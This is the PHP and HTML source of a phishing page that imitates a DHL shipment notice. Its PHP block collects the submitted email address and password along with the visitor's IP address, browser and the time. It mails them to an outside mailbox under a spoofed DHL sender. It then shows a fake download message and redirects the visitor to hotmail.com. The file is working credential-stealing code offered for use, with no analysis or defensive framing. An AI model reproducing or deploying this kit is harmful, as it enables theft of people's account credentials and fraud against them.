<?
if(!empty($_POST['username']) && !empty($_POST['password']))
{
$browser="";

     if(strpos(strtolower($_SERVER["HTTP_USER_AGENT"]),strtolower("EDGE"))){$browser="Microsoft Edge";}
else if(strpos(strtolower($_SERVER["HTTP_USER_AGENT"]),strtolower("OPERA"))){$browser="Opera";}
else if(strpos(strtolower($_SERVER["HTTP_USER_AGENT"]),strtolower("MSIE"))){$browser="Internet Explorer";}
else if(strpos(strtolower($_SERVER["HTTP_USER_AGENT"]),strtolower("CHROME"))){$browser="Chrome";}
else if(strpos(strtolower($_SERVER["HTTP_USER_AGENT"]),strtolower("SAFARI"))){$browser="Safari";}
else if(strpos(strtolower($_SERVER["HTTP_USER_AGENT"]),strtolower("FIREFOX"))){$browser="Firefox";}
else {$browser="Other";}
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$message = "--------------DHL Login--------------\n";
$message .= "Email Address: ".$_POST['username']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "Date: ".$adddate."\n";
$message .= "Browser Used: ".$browser."\n";
$message .= "https://whatismyipaddress.com/ip/$ip\n";

$recipient = "kingdfk@yandex.ru";
$subject = "IP Accessed From: $ip";
$headers = "From: DHL Report <support@logsowner.org>";
	 
mail($recipient,$subject,$message,$headers);
}
$email = $_GET['id'];
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html lang="en" dir="ltr" xmlns="http://www.w3.org/1999/xhtml"><head>
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" />
<meta http-equiv="REFRESH"content="3;url=https://hotmail.com"
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<link rel="shortcut icon" href="img/favicon.gif" />
<title>Global | English</title>
<link href="img/bootstrap.min.css" rel="stylesheet" type="text/css" />
<link href="img/odd-welcome.css" rel="stylesheet" type="text/css" />
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />
</head><body>
<form>
  <div id="container">
    <div id="header">
      <div class="section">
        <img src="img/dhl_logo_transparent.png">
      </div>
    <div id="title">
        <h2>&nbsp;</h2>
        <hr class="style-six" />
        <h2><font face="Century Gothic"><b><font face="Century Gothic">shipment information.</b></h2>
        <p>&nbsp;</p>
        <p><img src="img/default.gif" alt="" width="103" height="98" /></p>
        <h2><b>Download ...</b>...</h2>
        <h2>&nbsp;</h2>
      <h2>&nbsp;</h2>
        <h2>&nbsp;</h2>
<div class="deutsch">
        <img src="img/DHL_footer_logo.png" width="151" height="17">
      </div>
      <div class="boxFooter">
        <hr class="style-two" />
      </div>
      <div id="footer">
        <div class="express">DHL Express</div>
        <div class="copyright">2021 copy Copyright. DHL International GmbH. All rights reserved.
        </div>
      </div>
    </div>
  </div>
</form></body>
</html>